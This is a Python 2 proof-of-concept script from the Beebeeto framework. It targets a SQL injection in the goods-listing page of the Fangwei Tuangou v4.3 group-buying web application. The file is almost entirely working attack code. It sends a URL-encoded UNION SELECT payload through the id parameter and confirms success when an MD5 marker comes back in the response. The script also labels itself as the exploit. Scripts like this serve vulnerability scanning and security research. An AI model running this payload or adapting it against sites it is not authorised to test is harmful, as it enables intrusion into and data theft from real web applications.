#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0212',
            'name': '方维团购 v4.3 /app/source/goods_list.php SQL注入漏洞 POC',
            'author': 'xiangshou',
            'create_date': '2014-12-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '方维团购',
            'vul_version': ['4.3'],
            'type': 'SQL Injection',
            'tag': ['方维团购4.3漏洞', 'SQL注入漏洞', '/app/source/goods_list.php', 'php'],
            'desc': '方维团购 v4.3 /app/source/goods_list.php，id造成了注入',
            'references': ['http://sebug.net/vuldb/ssvid-87131',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = "/index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5%28333%29%29%23"
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '310dcbbf4cce62f762a2aaa148d556bd' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())